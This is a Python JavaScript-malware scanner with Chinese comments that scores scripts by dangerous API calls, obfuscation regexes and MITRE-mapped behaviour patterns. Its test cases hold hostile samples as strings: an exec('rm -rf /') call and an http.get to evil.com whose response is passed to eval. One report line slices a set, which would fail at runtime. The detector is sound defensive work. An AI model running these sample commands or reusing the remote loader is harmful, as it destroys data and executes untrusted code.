#!/usr/bin/env python3
"""
Scanner V3 - JavaScript 分析器 (Round 20)

支持 JavaScript/Node.js 脚本的安全检测
功能：词法分析 + AST 解析 + 行为特征提取 + 风险评分
"""

import re
import json
import subprocess
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum

class RiskLevel(Enum):
    SAFE = "safe"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class JSAnalysisResult:
    """JS 分析结果"""
    file_path: str
    is_malicious: bool
    risk_level: RiskLevel
    risk_score: float  # 0-100
    behaviors: List[str] = field(default_factory=list)
    dangerous_calls: List[Dict] = field(default_factory=list)
    obfuscation_detected: bool = False
    mitre_techniques: List[str] = field(default_factory=list)
    details: str = ""

class JSAnalyzer:
    """JavaScript 安全分析器"""
    
    def __init__(self):
        # 危险 API 映射
        self.dangerous_apis = {
            # 代码执行
            'eval': {'risk': 90, 'category': 'code_execution', 'mitre': 'T1059.007'},
            'Function': {'risk': 85, 'category': 'code_execution', 'mitre': 'T1059.007'},
            'setTimeout': {'risk': 70, 'category': 'code_execution', 'mitre': 'T1059.007'},
            'setInterval': {'risk': 70, 'category': 'code_execution', 'mitre': 'T1059.007'},
            
            # 命令执行
            'exec': {'risk': 95, 'category': 'command_execution', 'mitre': 'T1059'},
            'execSync': {'risk': 95, 'category': 'command_execution', 'mitre': 'T1059'},
            'spawn': {'risk': 90, 'category': 'command_execution', 'mitre': 'T1059'},
            'spawnSync': {'risk': 90, 'category': 'command_execution', 'mitre': 'T1059'},
            
            # 文件操作
            'readFileSync': {'risk': 60, 'category': 'file_access', 'mitre': 'T1005'},
            'readFile': {'risk': 60, 'category': 'file_access', 'mitre': 'T1005'},
            'writeFileSync': {'risk': 75, 'category': 'file_access', 'mitre': 'T1005'},
            'writeFile': {'risk': 75, 'category': 'file_access', 'mitre': 'T1005'},
            'unlinkSync': {'risk': 80, 'category': 'file_access', 'mitre': 'T1005'},
            'unlink': {'risk': 80, 'category': 'file_access', 'mitre': 'T1005'},
            
            # 网络请求
            'http.get': {'risk': 50, 'category': 'network', 'mitre': 'T1071'},
            'https.get': {'risk': 50, 'category': 'network', 'mitre': 'T1071'},
            'http.request': {'risk': 60, 'category': 'network', 'mitre': 'T1071'},
            'https.request': {'risk': 60, 'category': 'network', 'mitre': 'T1071'},
            'fetch': {'risk': 50, 'category': 'network', 'mitre': 'T1071'},
            'axios.get': {'risk': 50, 'category': 'network', 'mitre': 'T1071'},
            'axios.post': {'risk': 60, 'category': 'network', 'mitre': 'T1071'},
            
            # 动态加载
            'require': {'risk': 40, 'category': 'dynamic_load', 'mitre': 'T1059'},
            'import': {'risk': 35, 'category': 'dynamic_load', 'mitre': 'T1059'},
            
            # 进程创建
            'Process': {'risk': 85, 'category': 'process', 'mitre': 'T1059'},
            'fork': {'risk': 80, 'category': 'process', 'mitre': 'T1059'},
            
            # 环境变量
            'process.env': {'risk': 70, 'category': 'env_access', 'mitre': 'T1057'},
            
            # 子进程模块
            'child_process': {'risk': 85, 'category': 'command_execution', 'mitre': 'T1059'},
        }
        
        # 混淆模式
        self.obfuscation_patterns = [
            (r'\b_0x[a-fA-F0-9]{2,}\b', 'hex_variable'),  # 十六进制变量名
            (r'\b[a-zA-Z]\w{0,2}\s*=\s*function', 'short_var'),  # 短变量名函数
            (r'atob\s*\(', 'base64_decode'),  # Base64 解码
            (r'\\x[a-fA-F0-9]{2}', 'hex_string'),  # 十六进制字符串
            (r'\\u[a-fA-F0-9]{4}', 'unicode_string'),  # Unicode 字符串
            (r'eval\s*\(\s*[a-zA-Z_]\w*\s*\)', 'indirect_eval'),  # 间接 eval
        ]
        
        # 恶意行为模式
        self.malicious_patterns = [
            # 远程代码加载
            (r'(http|https)\.get\s*\([^)]*\)\s*.*eval\s*\(', 'remote_code_execution'),
            (r'fetch\s*\([^)]*\)\s*.*then\s*\([^)]*eval', 'remote_code_execution'),
            
            # 数据外传
            (r'fs\.readFile[a-z]*\s*\([^)]*\)\s*.*http', 'data_exfiltration'),
            (r'readFileSync\s*\([^)]*passwd', 'sensitive_file_read'),
            
            # 命令注入
            (r'exec\s*\(\s*[\'"`][^\'"]*[\'"`]\s*\+', 'command_injection'),
            (r'exec\s*\(\s*[a-zA-Z_]\w*\s*\+', 'command_injection'),
            
            # 持久化
            (r'writeFile[a-z]*\s*\([^)]*\.bashrc', 'persistence'),
            (r'writeFile[a-z]*\s*\([^)]*\.profile', 'persistence'),
        ]
    
    def analyze(self, file_path: str) -> JSAnalysisResult:
        """分析 JS 文件"""
        path = Path(file_path)
        
        if not path.exists():
            return JSAnalysisResult(
                file_path=str(file_path),
                is_malicious=False,
                risk_level=RiskLevel.SAFE,
                risk_score=0,
                details="File not found"
            )
        
        # 读取代码
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            code = f.read()
        
        return self.analyze_code(code, str(path))
    
    def analyze_code(self, code: str, file_path: str = "<string>") -> JSAnalysisResult:
        """分析 JS 代码字符串"""
        behaviors = []
        dangerous_calls = []
        mitre_techniques = set()
        risk_score = 0
        obfuscation_detected = False
        
        # 1. 词法分析 - 查找危险 API 调用
        for api_name, api_info in self.dangerous_apis.items():
            # 简单模式匹配
            pattern = rf'\b{re.escape(api_name)}\s*\('
            matches = re.finditer(pattern, code)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                dangerous_calls.append({
                    'api': api_name,
                    'line': line_num,
                    'risk': api_info['risk'],
                    'category': api_info['category'],
                    'mitre': api_info['mitre']
                })
                behaviors.append(f"{api_info['category']}: {api_name}")
                mitre_techniques.add(api_info['mitre'])
                risk_score += api_info['risk'] * 0.3
        
        # 2. 混淆检测
        for pattern, obf_type in self.obfuscation_patterns:
            if re.search(pattern, code):
                obfuscation_detected = True
                behaviors.append(f"obfuscation: {obf_type}")
                risk_score += 15
        
        # 3. 恶意行为模式检测
        for pattern, behavior_type in self.malicious_patterns:
            if re.search(pattern, code, re.DOTALL):
                behaviors.append(f"malicious_pattern: {behavior_type}")
                risk_score += 25
                if behavior_type == 'remote_code_execution':
                    mitre_techniques.add('T1059.007')
                elif behavior_type == 'data_exfiltration':
                    mitre_techniques.add('T1041')
                elif behavior_type == 'persistence':
                    mitre_techniques.add('T1053')
        
        # 4. 归一化风险评分 (0-100)
        risk_score = min(100, risk_score)
        
        # 5. 确定风险等级
        if risk_score >= 80:
            risk_level = RiskLevel.CRITICAL
        elif risk_score >= 60:
            risk_level = RiskLevel.HIGH
        elif risk_score >= 40:
            risk_level = RiskLevel.MEDIUM
        elif risk_score >= 20:
            risk_level = RiskLevel.LOW
        else:
            risk_level = RiskLevel.SAFE
        
        # 6. 判断是否恶意
        is_malicious = risk_score >= 50
        
        # 7. 生成详情
        details = self._generate_details(dangerous_calls, behaviors, obfuscation_detected)
        
        return JSAnalysisResult(
            file_path=file_path,
            is_malicious=is_malicious,
            risk_level=risk_level,
            risk_score=round(risk_score, 2),
            behaviors=list(set(behaviors)),
            dangerous_calls=dangerous_calls,
            obfuscation_detected=obfuscation_detected,
            mitre_techniques=list(mitre_techniques),
            details=details
        )
    
    def _generate_details(self, dangerous_calls: list, behaviors: list, obfuscation: bool) -> str:
        """生成详细报告"""
        lines = []
        
        if dangerous_calls:
            lines.append(f"发现 {len(dangerous_calls)} 个危险 API 调用:")
            for call in dangerous_calls[:5]:  # 最多显示 5 个
                lines.append(f"  - {call['api']} (行 {call['line']}, 风险 {call['risk']})")
        
        if obfuscation:
            lines.append("⚠️  检测到代码混淆")
        
        if behaviors:
            lines.append(f"检测到的行为：{', '.join(set(behaviors)[:5])}")
        
        return '\n'.join(lines) if lines else "未发现明显风险"
    
    def scan_directory(self, dir_path: str) -> List[JSAnalysisResult]:
        """扫描目录中的所有 JS 文件"""
        results = []
        path = Path(dir_path)
        
        for js_file in path.glob("**/*.js"):
            result = self.analyze(str(js_file))
            results.append(result)
        
        return results


def main():
    """测试 JS 分析器"""
    analyzer = JSAnalyzer()
    
    # 测试代码
    test_cases = [
        # 恶意代码
        ("""
        const { exec } = require('child_process');
        exec('rm -rf /', (err) => {
            console.log('Done');
        });
        """, True, "命令执行"),
        
        # 恶意代码 - 远程加载
        ("""
        const http = require('http');
        http.get('http://evil.com/malware.js', (res) => {
            let code = '';
            res.on('data', chunk => code += chunk);
            res.on('end', () => eval(code));
        });
        """, True, "远程代码执行"),
        
        # 安全代码
        ("""
        function add(a, b) {
            return a + b;
        }
        console.log(add(1, 2));
        """, False, "安全代码"),
        
        # 混淆代码
        ("""
        var _0xabc = ['eval', 'log'];
        var fn = window[_0xabc[0]];
        fn(atob('Y29uc29sZS5sb2coIkhlbGxvIik='));
        """, True, "混淆 + eval"),
    ]
    
    print("=" * 60)
    print("🔍 JS Analyzer 测试")
    print("=" * 60)
    
    for code, expected_malicious, description in test_cases:
        result = analyzer.analyze_code(code, f"<test: {description}>")
        status = "✅" if result.is_malicious == expected_malicious else "❌"
        print(f"\n{status} {description}")
        print(f"   恶意：{result.is_malicious} (期望：{expected_malicious})")
        print(f"   风险评分：{result.risk_score}")
        print(f"   风险等级：{result.risk_level.value}")
        if result.dangerous_calls:
            print(f"   危险调用：{len(result.dangerous_calls)} 个")
    
    print("\n" + "=" * 60)
    print("✅ 测试完成")
    print("=" * 60)


if __name__ == '__main__':
    main()
